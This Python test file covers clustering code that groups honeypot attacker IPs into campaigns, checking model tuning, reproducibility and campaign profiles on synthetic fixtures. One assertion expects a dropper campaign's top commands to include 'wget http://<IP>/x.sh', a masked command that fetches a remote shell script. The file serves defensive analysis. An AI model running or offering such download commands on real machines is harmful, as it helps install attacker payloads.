import numpy as np
import polars as pl
import pytest
from sklearn.metrics import adjusted_rand_score

from honeypot.analysis.ml.campaigns.clustering import (
    NOISE,
    CampaignConfig,
    Embedding,
    campaign_profiles,
    command_sequence_labels,
    credential_cluster_labels,
    evaluate_on_test,
    external_agreement,
    fit_clusters,
    fit_final,
    pair_agreement,
    prediction_strength,
    relabel_by_size,
    select_config,
    tune,
)
from honeypot.analysis.ml.campaigns.profiles import ip_profiles
from honeypot.analysis.ml.splits import assign_splits
from honeypot.analysis.ml.tests.fixtures import CAMPAIGNS, campaign_events

SMALL = CampaignConfig(
    n_components=(5,),
    kmeans_k=(2, 3, 4, 6),
    ward_k=(4,),
    hdbscan_min_cluster_size=(5,),
    stability_resamples=3,
)


@pytest.fixture(scope="module")
def data() -> dict:
    events, truth = campaign_events(ips_per_campaign=60)
    profiles = (
        ip_profiles(events)
        .join(truth, on="src_ip", maintain_order="left")
        .with_columns(
            pl.format("AS{} Net", pl.col("asn")).alias("as_label"),
            pl.lit("US").alias("country"),
        )
    )
    return {"events": events, "truth": truth, "profiles": assign_splits(profiles)}


def _split(data: dict, *names: str) -> pl.DataFrame:
    return data["profiles"].filter(pl.col("split").is_in(names))


def test_relabel_by_size_keeps_noise() -> None:
    labels = np.array([5, 5, 2, NOISE, 2, 2, 9])
    assert relabel_by_size(labels).tolist() == [1, 1, 0, NOISE, 0, 0, 2]


def test_pair_agreement_and_prediction_strength() -> None:
    independent = np.array([0, 0, 0, 0, 1, 1, 1, NOISE])
    assigned = np.array([7, 7, 7, 8, 9, 9, 9, 9])
    agreement = pair_agreement(independent, assigned, min_size=2)
    # Cluster 0: 3 of its 6 pairs stay together; cluster 1: all 3.
    assert agreement == {0: (4, 0.5), 1: (3, 1.0)}
    ps_min, ps_weighted = prediction_strength(independent, assigned, min_size=2)
    assert ps_min == 0.5
    assert ps_weighted == pytest.approx((4 * 0.5 + 3 * 1.0) / 7)
    assert np.isnan(prediction_strength(independent, assigned, min_size=5)[0])


def test_kmeans_recovers_planted_campaigns(data: dict) -> None:
    profiles = data["profiles"]
    embedded = Embedding(5, 0, SMALL.block_weights, SMALL.min_df).fit(profiles)
    labels = fit_clusters(embedded.transform(profiles), "kmeans", 4, seed=0)
    assert adjusted_rand_score(profiles["campaign"], labels) > 0.9


def test_tuning_selects_the_planted_number_of_campaigns(data: dict) -> None:
    tuning = tune(_split(data, "train"), _split(data, "validation"), SMALL)

    assert tuning.height == len(SMALL.grid())
    assert set(tuning["algorithm"]) == {"kmeans", "ward", "hdbscan"}
    chosen = select_config(tuning, SMALL)
    assert chosen["eligible"]
    assert chosen["train_n_clusters"] == len(CAMPAIGNS)
    assert chosen["val_prediction_strength_weighted"] > 0.9


def test_tuning_is_deterministic(data: dict) -> None:
    train, validation = _split(data, "train"), _split(data, "validation")
    assert tune(train, validation, SMALL).equals(tune(train, validation, SMALL))


def test_final_model_reproduces_on_test(data: dict) -> None:
    chosen = {"n_components": 5, "algorithm": "kmeans", "param": 4}
    model = fit_final(_split(data, "train", "validation"), chosen, SMALL)
    test = _split(data, "test")
    assigned, metrics, reproducibility = evaluate_on_test(model, test, chosen, SMALL)

    assert len(assigned) == test.height == metrics["ips"]
    assert adjusted_rand_score(test["campaign"], assigned) > 0.9
    assert metrics["prediction_strength"] > 0.9
    assert reproducibility["campaign"].to_list() == [0, 1, 2, 3]
    assert reproducibility["test_ips"].sum() == test.height
    assert reproducibility["test_reproducibility"].drop_nulls().min() > 0.9


def test_external_references(data: dict) -> None:
    commands = command_sequence_labels(data["events"])
    with_commands = data["truth"].filter(
        pl.col("campaign").is_in(
            [name for name, spec in CAMPAIGNS.items() if spec["commands"]]
        )
    )
    assert set(commands["src_ip"]) == set(with_commands["src_ip"])
    per_campaign = (
        commands.join(data["truth"], on="src_ip")
        .group_by("campaign")
        .agg(pl.col("label").n_unique())
    )
    assert per_campaign["label"].max() == 1

    credentials = credential_cluster_labels(data["events"])
    assert credentials["src_ip"].is_unique().all()

    campaigns = data["truth"].select(
        "src_ip", pl.col("campaign").rank("dense").cast(pl.Int64).alias("campaign")
    )
    agreement = external_agreement(campaigns, {"commands": commands})
    assert agreement["ari"][0] == pytest.approx(1.0)
    assert agreement["linked_kept_together"][0] == pytest.approx(1.0)
    assert agreement["ips"][0] == agreement["linked_ips"][0] == with_commands.height

    # A reference of singletons plus one linked pair split across two
    # campaigns: nothing linked is kept together.
    split_pair = pl.DataFrame({"src_ip": ["a", "b", "c"], "campaign": [0, 1, 1]})
    singletons = pl.DataFrame({"src_ip": ["a", "b", "c"], "label": ["x", "x", "y"]})
    row = external_agreement(split_pair, {"ref": singletons}).row(0, named=True)
    assert row["linked_ips"] == 2
    assert row["linked_kept_together"] == 0.0


def test_campaign_profiles(data: dict) -> None:
    labelled = data["profiles"].with_columns(
        pl.col("campaign").rank("dense").cast(pl.Int64).alias("campaign"),
        (pl.col("telnet_share") > 0).alias("tried_ai_username"),
    )
    catalog = campaign_profiles(labelled)
    assert catalog.height == len(CAMPAIGNS)
    assert catalog["ips"].sum() == labelled.height
    assert (
        catalog["train_ips"] + catalog["validation_ips"] + catalog["test_ips"]
    ).to_list() == catalog["ips"].to_list()
    dropper = catalog.filter(pl.col("download_ip_share") == 1.0)
    assert dropper.height == 1
    assert "wget http://<IP>/x.sh" in dropper["top_commands"][0]
    assert "203.0.113.9" not in "".join(catalog["top_commands"].to_list())
    assert set(catalog["ai_username_share"].to_list()) == {0.0, 1.0}


def test_config_round_trips_and_grid() -> None:
    config = CampaignConfig()
    assert CampaignConfig.from_dict(config.to_dict()) == config
    assert len(config.grid()) == len(config.n_components) * (
        len(config.kmeans_k) + len(config.ward_k) + len(config.hdbscan_min_cluster_size)
    )
